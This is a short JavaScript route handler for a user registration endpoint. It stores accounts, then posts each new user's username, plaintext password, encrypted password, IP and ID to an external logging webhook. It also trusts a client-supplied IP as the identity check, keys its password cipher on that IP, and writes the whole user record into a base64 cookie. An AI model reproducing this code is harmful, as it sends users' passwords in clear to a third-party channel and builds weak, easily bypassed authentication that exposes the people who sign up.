const
    { webhooks } = require("../../utils/config.json"),
    {
        jsonToBase64,
        sendWebhook,
        createId,
        getTimeStamp,
        cipher
    } = require("../../utils/all.js");
module.exports = {
    path: "/inscription",
    method: "post",
    go: async (db, req, res) => {
        const
            { u, m, ip } = req.body,
            alluser = db.get("user") || [],
            existUser = alluser.filter(e => e.ip == ip)[0];
        if (existUser) res.send("2");
        else {
            const myCipher = cipher(String(ip.replaceAll(".", "")))
            const
                rm = req.body.m,
                mdpCry = myCipher(m),
                id = createId();
            req.body.m = mdpCry;
            req.body.c = getTimeStamp();
            req.body.id = id;
            db.push("user", req.body);
            res.cookie("connexion", jsonToBase64(req.body));
            res.send("1");
            sendWebhook(webhooks.logs.loginregister, {
                username: "Cop Ta Sapp Logs -  Connexion/Inscription",
                embeds: [
                    {
                        title: "New inscription 👀",
                        color: 2201331,
                        fields: [
                            {
                                name: "`👤` User",
                                value: `\`\`\`User: ${u}\nMdp: ${rm} (${mdpCry})\nIp: ${ip}\nID: ${id}\`\`\``
                            },
                            {
                                name: "`📆` Date",
                                value: getTimeStamp()
                            }
                        ]
                    }
                ]
            })
        };
    }
}